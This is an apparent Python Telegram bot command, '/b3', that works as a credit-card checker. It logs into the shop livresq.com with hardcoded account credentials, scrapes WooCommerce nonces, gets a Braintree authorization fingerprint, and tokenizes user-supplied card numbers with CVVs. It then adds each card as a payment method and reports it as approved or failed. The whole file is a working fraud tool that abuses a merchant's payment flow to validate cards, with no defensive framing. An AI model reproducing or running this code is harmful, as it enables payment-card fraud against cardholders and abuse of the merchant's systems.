# commands/braintree.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import requests
import re
import base64
import json
import uuid
import time

router = Router()

# Hardcoded credentials (same as original script)
EMAIL = "00t0a9@givememail.club"
PASSWORD = "Lundka143"

# Helper to run blocking functions in a thread pool
async def run_sync(func, *args, **kwargs):
    return await asyncio.to_thread(func, *args, **kwargs)

# ---------- HTTP headers (exactly as in original script) ----------
def h1():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h2():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h3():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/payment-methods/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h4():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def ajax_h():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i',
    }

def bt_h(fp):
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {fp}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://assets.braintreegateway.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

# ---------- Core logic functions (adapted to be synchronous but callable in thread) ----------
def login_sync():
    s = requests.Session()
    r = s.get('https://livresq.com/en/my-account/', headers=h1())
    n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
    if not n:
        return None
    data = {
        'username': EMAIL,
        'password': PASSWORD,
        'woocommerce-login-nonce': n.group(1),
        '_wp_http_referer': '/en/contul-meu/',
        'login': 'Log in',
        'trp-form-language': 'en'
    }
    r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=data)
    if 'woocommerce-error' in r.text or not ('logout' in r.text.lower() or 'dashboard' in r.text.lower()):
        return None
    return s

def get_nonces_sync(s):
    r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
    an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
    cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
    if not cn:
        cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
    if not an or not cn:
        return None, None
    return an.group(1), cn.group(1)

def get_fp_sync(s, cn):
    if not cn:
        return None
    data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
    r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=data)
    if r.status_code != 200:
        return None
    try:
        j = r.json()
        dt = base64.b64decode(j['data']).decode('utf-8')
        fp = json.loads(dt).get('authorizationFingerprint')
        return fp
    except:
        return None

def tokenize_card_sync(fp, cc, mm, yy, cvv):
    """Synchronous version using requests (instead of aiohttp)"""
    session = requests.Session()
    sid = str(uuid.uuid4())
    payload = {
        'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': sid},
        'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
            tokenizeCreditCard(input: $input) {
                token
            }
        }''',
        'variables': {
            'input': {
                'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv},
                'options': {'validate': False}
            }
        },
        'operationName': 'TokenizeCreditCard'
    }
    resp = session.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=payload)
    if resp.status_code != 200:
        return None
    res = resp.json()
    token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
    return token

def add_payment_method_sync(s, token, add_nonce):
    for attempt in range(4):
        post_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/en/contul-meu/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            'trp-form-language': 'en'
        }
        r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=post_data)
        if 'You cannot add a new payment method so soon' in r.text:
            time.sleep(15)
            continue
        # Check for error messages
        error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
        if error_match:
            err_text = re.sub(r'\s+', ' ', error_match.group(1).strip())
            err_text = re.sub(r'&nbsp;', ' ', err_text)
            return False, err_text
        # Check for success
        if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
            return True, "APPROVED"
        success_match = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
        if success_match:
            success_text = re.sub(r'<[^>]+>', '', success_match.group(1).strip())
            success_text = re.sub(r'\s+', ' ', success_text)
            return True, success_text
        time.sleep(15)
    return False, "UNKNOWN"

async def process_card(cc, mm, yy, cvv):
    """Main async wrapper that runs blocking steps in threads"""
    # Step 1: Login
    session = await run_sync(login_sync)
    if not session:
        return False, "LOGIN FAILED"
    # Step 2: Get nonces
    add_nonce, client_nonce = await run_sync(get_nonces_sync, session)
    if not add_nonce or not client_nonce:
        return False, "NONCES FAILED"
    # Step 3: Get fingerprint
    fp = await run_sync(get_fp_sync, session, client_nonce)
    if not fp:
        return False, "FINGERPRINT FAILED"
    # Step 4: Tokenize card
    token = await run_sync(tokenize_card_sync, fp, cc, mm, yy, cvv)
    if not token:
        return False, "TOKENIZE FAILED"
    # Step 5: Add payment method
    success, msg = await run_sync(add_payment_method_sync, session, token, add_nonce)
    return success, msg

# ---------- Telegram command ----------
@router.message(Command("b3"))
async def cmd_b3(message: types.Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer(
            "❌ **Usage:** `/b3 CC|MM|YY|CVV`\n"
            "Example: `/b3 4111111111111111|12|28|123`\n"
            "(Year can be 2 or 4 digits)"
        )
        return

    card_str = parts[1].strip()
    try:
        cc, mm, yy, cvv = [x.strip() for x in card_str.split('|')]
        if len(yy) == 2:
            yy = str(2000 + int(yy))  # Convert to 4-digit year for Braintree
        mm = mm.zfill(2)
    except Exception:
        await message.answer("❌ Invalid format. Use: `CC|MM|YY|CVV`")
        return

    progress = await message.answer("⏳ **Processing card...**")
    try:
        success, msg = await process_card(cc, mm, yy, cvv)
        if success:
            await progress.edit_text(f"✅ **SUCCESS**\n💳 Card: `{cc}|{mm}|{yy[-2:]}|{cvv}`\n📦 Response: {msg}")
        else:
            await progress.edit_text(f"❌ **FAILED**\n💳 Card: `{cc}|{mm}|{yy[-2:]}|{cvv}`\n📦 Response: {msg}")
    except Exception as e:
        await progress.edit_text(f"❌ **Exception:** {str(e)}")
